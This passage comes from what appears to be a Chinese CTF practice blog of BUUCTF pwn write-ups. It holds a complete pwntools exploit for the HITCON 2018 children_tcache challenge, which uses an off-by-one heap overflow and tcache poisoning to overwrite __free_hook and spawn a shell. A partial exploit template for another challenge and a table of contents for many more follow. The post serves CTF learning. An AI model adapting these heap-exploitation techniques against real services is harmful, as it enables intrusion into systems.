class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./HITCON_2018_children_tcache_debug&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;debug&quot;</span> in elf_path:</span><br><span class="line">    libc_path = elf.linker.decode().replace(<span class="string">&quot;ld&quot;</span>, <span class="string">&quot;./libc&quot;</span>)</span><br><span class="line">    libc = ELF(libc_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc_path:</span><br><span class="line">        one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">    elif <span class="string">&quot;2.27&quot;</span> in libc_path:</span><br><span class="line">        one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        one_gadget = []</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc_path = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">26107</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> libc_path != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        io = process(elf_path, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: libc_path&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    # 断点设置在c之前就好,查看bss时候要在c后面, x/<span class="number">5</span>xg $rebase(<span class="number">0xAF9</span>)</span><br><span class="line">    <span class="meta"># b *$rebase(0x14F6)</span></span><br><span class="line">    <span class="meta"># b *$rebase(0x13A9)</span></span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *$rebase(0xD6B)</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/6xg $rebase(0x202060)</span></span><br><span class="line"><span class="string">    x/6xg $rebase(0x2020C0)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"># 存在off by one</span><br><span class="line">def add(size: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sa(b<span class="string">&quot;choice: &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Size:&quot;</span>, str(size).encode())</span><br><span class="line">    sa(b<span class="string">&quot;Data:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">def show(index: <span class="type">int</span>):</span><br><span class="line">    sa(b<span class="string">&quot;choice: &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Index:&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="meta"># def edit(index: int, content: bytes):</span></span><br><span class="line"><span class="meta">#     sla(b<span class="string">&quot;choice: &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span></span><br><span class="line"><span class="meta">#     sla(b<span class="string">&quot;index : \n&quot;</span>, str(index).encode())</span></span><br><span class="line"><span class="meta">#     sla(b<span class="string">&quot;Please enter the length of item name:&quot;</span>, str(len(content)).encode())</span></span><br><span class="line"><span class="meta">#     sa(b<span class="string">&quot;Please enter the new name of the item:&quot;</span>, content)</span></span><br><span class="line"></span><br><span class="line"># 这里有个小trick,他是根据请求的size进行清空，只要我们不断把size变小，就不会重复填入\xda</span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sa(b<span class="string">&quot;choice: &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Index:&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x4F8</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0x18</span> - i, b<span class="string">&quot;a&quot;</span> * (<span class="number">0x18</span> - i))</span><br><span class="line">    <span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + p16(<span class="number">0x440</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x418</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(rld().ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - <span class="number">0x7FD7F4B60CA0</span> + <span class="number">0x7FD7F4775000</span></span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;c&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">free_hook_addr = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_addr = libc_base + one_gadget[<span class="number">1</span>]</span><br><span class="line">add(<span class="number">0x18</span>, p64(free_hook_addr))</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line"><span class="meta"># debug()</span></span><br><span class="line">add(<span class="number">0x18</span>, p64(system_addr))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">it()</span><br><span class="line"><span class="meta"># debug()</span></span><br><span class="line"><span class="meta"># add(0x18, b<span class="string">&quot;a&quot;</span> * 0x10 + p64(0x20))</span></span><br><span class="line"><span class="meta"># free(0)</span></span><br><span class="line"><span class="meta"># add(0x18, b<span class="string">&quot;aa&quot;</span>)</span></span><br><span class="line"><span class="meta"># show(0)</span></span><br><span class="line"><span class="meta"># rl()</span></span><br><span class="line"><span class="meta"># rl()</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># add(0x18, b<span class="string">&quot;a&quot;</span> * 0x17)</span></span><br><span class="line"><span class="meta"># for i in range(9):</span></span><br><span class="line"><span class="meta">#     add(0x2000 - 8, b<span class="string">&quot;a&quot;</span> * 0x17)</span></span><br><span class="line"># <span class="meta"># for i in range(2, 9):</span></span><br><span class="line"># <span class="meta">#     free(i)</span></span><br><span class="line"><span class="meta"># free(2)</span></span><br><span class="line"><span class="meta"># free(0)</span></span><br><span class="line"><span class="meta"># add(0x18, b<span class="string">&quot;a&quot;</span> * 0x18)</span></span><br><span class="line"><span class="meta"># free(0)</span></span><br><span class="line"><span class="meta"># add(0x18, b<span class="string">&quot;a&quot;</span> * 0x10 + b<span class="string">&quot;a&quot;</span> * 0x6 + b<span class="string">&quot;\0&quot;</span>)</span></span><br><span class="line"><span class="meta"># free(1)</span></span><br><span class="line"><span class="meta"># add(0x18, b<span class="string">&quot;&quot;</span>)</span></span><br><span class="line"><span class="meta"># free(1)</span></span><br></pre></td></tr></table></figure>

<h1 id="old-edition"><a href="#old-edition" class="headerlink" title="old edition"></a>old edition</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./pwn200_debug&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;debug&quot;</span> in elf_path:</span><br><span class="line">    libc_path = elf.linker.decode().replace(<span class="string">&quot;ld&quot;</span>, <span class="string">&quot;./libc&quot;</span>)</span><br><span class="line">    libc = ELF(libc_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc_path:</span><br><span class="line">        one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">    elif <span class="string">&quot;2.27&quot;</span> in libc_path:</span><br><span class="line">        one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        one_gadget = []</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc_path = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">29413</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> libc_path != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        io = process(elf_path, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: libc_path&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    b *0x400A72</span></span><br><span class="line"><span class="string">    b *0x400a8c</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br></pre></td></tr></table></figure>

    </article>
    <!-- license -->
    
        <div class="license-wrapper">
            <p>Author：<a href="https://azraelxuemo.github.io">azraelxuemo</a>
            <p>Link：<a href="https://azraelxuemo.github.io/2023/11/12/BUUCTF%E5%88%B7%E9%A2%98/">https://azraelxuemo.github.io/2023/11/12/BUUCTF%E5%88%B7%E9%A2%98/</a>
            <p>Publish date：<a href="https://azraelxuemo.github.io/2023/11/12/BUUCTF%E5%88%B7%E9%A2%98/">November 12th 2023, 1:51:34 pm</a>
            <p>Update date：<a href="https://azraelxuemo.github.io/2023/11/12/BUUCTF%E5%88%B7%E9%A2%98/">November 15th 2023, 8:06:12 pm</a>
            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href="/2023/11/13/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" title="容器逃逸 All in One">
                    <div class="nextTitle">容器逃逸 All in One</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href="/index.html" title="Welcome">
                    <div class="prevTitle">Welcome</div>
                </a>
            
        </li>
    </ul>
    <!-- comment -->
    
        <div class="post-comment">
            <!-- 来必力 City 版安装代码 -->


            

            

            

            <!-- utteranc评论 -->


            <!-- partial('_partial/comment/changyan') -->
            <!--PC版-->


            
            

            

        </div>
    
    <!-- timeliness note -->
    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
    
    <!-- Mathjax -->
    
</main>

                <!-- profile -->
                
            </div>
            <footer class="footer footer-unloaded">
    <!-- social  -->
    
        <div class="social">
            
    
        
            
                <a href="mailto:12345@qq.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="//github.com/azraelxuemo" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
            
                <span class="iconfont-archer wechat" title=wechat>
                    
                    <img class="profile-qr" src="/assets/example_qr.png" />
                </span>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    


        </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- website approve for Chinese user -->
    
    <!-- 不蒜子  -->
    
        <div class="busuanzi-container">
            
             
                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
            
        </div>
    	
</footer>

        </div>
        <!-- toc -->
        
            <div class="toc-wrapper toc-wrapper-loding" style=







    top:50vh;

>
                <div class="toc-catalog">
                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                </div>
                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">1.</span> <span class="toc-text">爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E7%AE%97%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">爆破算法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#iscc2018-final-pwn1"><span class="toc-number">1.1.1.</span> <span class="toc-text">iscc2018_final_pwn1</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BC%AA%E9%9A%8F%E6%9C%BA"><span class="toc-number">2.</span> <span class="toc-text">伪随机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B"><span class="toc-number">2.1.</span> <span class="toc-text">随机数预测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bitsctf-2017-random-game"><span class="toc-number">2.1.1.</span> <span class="toc-text">bitsctf_2017_random_game</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-number">3.</span> <span class="toc-text">虚拟机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#seccon2018-kindvm"><span class="toc-number">3.1.</span> <span class="toc-text">seccon2018_kindvm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wdb-2018-2nd-hvm"><span class="toc-number">3.2.</span> <span class="toc-text">wdb_2018_2nd_hvm</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#C-S%E6%9E%B6%E6%9E%84%E9%A2%98%E7%9B%AE"><span class="toc-number">4.</span> <span class="toc-text">C&#x2F;S架构题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GKCTF-2021-demo-catRoom"><span class="toc-number">4.1.</span> <span class="toc-text">[GKCTF 2021]demo_catRoom</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A5%BD%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text">好题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%88%9D%E5%A7%8B%E5%8C%96%E5%8F%98%E9%87%8F"><span class="toc-number">5.1.</span> <span class="toc-text">利用初始化变量</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hitb-2017-1000levels"><span class="toc-number">5.1.1.</span> <span class="toc-text">hitb-2017 1000levels</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2dlresolve"><span class="toc-number">5.2.</span> <span class="toc-text">ret2dlresolve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HITCON-2015-blinkroot"><span class="toc-number">5.2.1.</span> <span class="toc-text">HITCON 2015 -blinkroot</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BYPASS-PIE"><span class="toc-number">5.3.</span> <span class="toc-text">BYPASS PIE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unexplitable"><span class="toc-number">5.3.1.</span> <span class="toc-text">unexplitable</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%B8%8D%E6%98%8E%E6%98%BE"><span class="toc-number">5.4.</span> <span class="toc-text">漏洞不明显</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#inndy-notepad"><span class="toc-number">5.4.1.</span> <span class="toc-text">inndy_notepad</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8A%B1%E5%BC%8Funlink"><span class="toc-number">5.5.</span> <span class="toc-text">花式unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-en-5"><span class="toc-number">5.5.1.</span> <span class="toc-text">ciscn_2019_en_5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%88%86%E9%85%8D%E5%9C%B0%E5%9D%80%E5%8F%97%E9%99%90"><span class="toc-number">5.6.</span> <span class="toc-text">堆分配地址受限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#qwb2019-one"><span class="toc-number">5.6.1.</span> <span class="toc-text">qwb2019_one</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%A2%98%E7%9B%AE"><span class="toc-number">6.</span> <span class="toc-text">奇奇怪怪的题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%BC%E5%90%88bypass"><span class="toc-number">6.1.</span> <span class="toc-text">综合bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn-2019-final-10"><span class="toc-number">6.1.1.</span> <span class="toc-text">ciscn_2019_final_10</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E5%B8%B8"><span class="toc-number">6.2.</span> <span class="toc-text">异常</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#itcon-2018-hackergame-2018-calc"><span class="toc-number">6.2.1.</span> <span class="toc-text">itcon_2018_hackergame_2018_calc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ulimit"><span class="toc-number">6.3.</span> <span class="toc-text">ulimit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-otp"><span class="toc-number">6.3.1.</span> <span class="toc-text">pwnable_otp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A%E5%99%A8"><span class="toc-number">7.</span> <span class="toc-text">解释器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#wdb-2018-final-pwn1"><span class="toc-number">7.1.</span> <span class="toc-text">wdb_2018_final_pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-bf"><span class="toc-number">7.2.</span> <span class="toc-text">pwnable_bf</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exit"><span class="toc-number">8.</span> <span class="toc-text">exit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#elf-set-libc-atexit-elementIO-cleanup"><span class="toc-number">8.1.</span> <span class="toc-text">elf_set___libc_atexit_elementIO_cleanup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#newest-note"><span class="toc-number">8.1.1.</span> <span class="toc-text">newest_note</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IO"><span class="toc-number">9.</span> <span class="toc-text">IO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#flush"><span class="toc-number">9.1.</span> <span class="toc-text">flush</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#seccon2022-babyfile"><span class="toc-number">9.1.1.</span> <span class="toc-text">seccon2022-babyfile</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#scanf"><span class="toc-number">9.2.</span> <span class="toc-text">scanf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#espcially-tu-2016"><span class="toc-number">9.2.1.</span> <span class="toc-text">espcially_tu_2016</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fclose"><span class="toc-number">9.3.</span> <span class="toc-text">fclose</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xman%E5%A4%8F%E4%BB%A4%E8%90%A5%E9%80%89%E6%8E%92%E4%BD%8D%E8%B5%9B-2018-challenge1"><span class="toc-number">9.3.1.</span> <span class="toc-text">xman夏令营选排位赛_2018_challenge1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#close"><span class="toc-number">9.4.</span> <span class="toc-text">close</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#d3ctf-2019-unprintablev"><span class="toc-number">9.4.1.</span> <span class="toc-text">d3ctf_2019_unprintablev</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stdin%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">9.5.</span> <span class="toc-text">stdin任意地址写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#whctf2017-stackoverflow"><span class="toc-number">9.5.1.</span> <span class="toc-text">whctf2017_stackoverflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn2018-echo-back"><span class="toc-number">9.5.2.</span> <span class="toc-text">ciscn2018_echo_back</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81-rtld-global%E5%87%BD%E6%95%B0"><span class="toc-number">10.</span> <span class="toc-text">劫持_rtld_global函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dl-rtld-unlock-recursive"><span class="toc-number">10.1.</span> <span class="toc-text">_dl_rtld_unlock_recursive</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hctf2018-the-end"><span class="toc-number">10.1.1.</span> <span class="toc-text">hctf2018_the_end</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%88"><span class="toc-number">11.</span> <span class="toc-text">栈</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#alloca"><span class="toc-number">11.1.</span> <span class="toc-text">alloca</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#secconctf2016-cheer-msg"><span class="toc-number">11.1.1.</span> <span class="toc-text">secconctf2016_cheer_msg</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA%E8%A6%86%E7%9B%96%E5%85%B3%E9%94%AE%E5%86%85%E5%AE%B9"><span class="toc-number">11.2.</span> <span class="toc-text">溢出覆盖关键内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#canary%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86"><span class="toc-number">11.2.1.</span> <span class="toc-text">canary异常处理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#checker-seccon-2016"><span class="toc-number">11.2.1.1.</span> <span class="toc-text">checker_seccon_2016</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D"><span class="toc-number">11.2.2.</span> <span class="toc-text">另一种</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pwnable-loveletter"><span class="toc-number">11.2.2.1.</span> <span class="toc-text">pwnable_loveletter</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E5%96%B7"><span class="toc-number">11.3.</span> <span class="toc-text">栈喷</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#metasequoia-2020-snow-mountain"><span class="toc-number">11.3.1.</span> <span class="toc-text">metasequoia_2020_snow_mountain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#picoctf-2018-gps"><span class="toc-number">11.3.2.</span> <span class="toc-text">picoctf_2018_gps</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C"><span class="toc-number">11.4.</span> <span class="toc-text">数组越界</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wdb-2022-main"><span class="toc-number">11.4.1.</span> <span class="toc-text">wdb-2022-main</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#arr-sun-2016"><span class="toc-number">11.4.2.</span> <span class="toc-text">arr_sun_2016</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#canary%E7%88%86%E7%A0%B4"><span class="toc-number">11.5.</span> <span class="toc-text">canary爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#starctf2018-babystack"><span 